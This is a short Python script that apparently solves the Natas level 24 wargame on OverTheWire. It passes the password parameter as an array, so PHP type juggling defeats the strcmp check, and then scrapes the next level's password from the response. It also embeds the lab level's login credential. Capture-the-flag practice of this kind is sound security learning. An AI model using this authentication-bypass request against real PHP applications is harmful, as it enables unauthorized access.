import requests
import re

username = 'natas24'
password = '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'

# https://cybernetgen.com/auth-bypass-with-php-type-juggling/
url = 'http://%s.natas.labs.overthewire.org/?passwd[]=""' % username

with open('natas24.html', 'w+') as out:
    session = requests.Session()
    res = session.get(url, auth=(username, password))
    content = res.text
    out.write(content)
    flag = re.findall('Password: (.+?)</pre>', content)[0]
    print(flag)
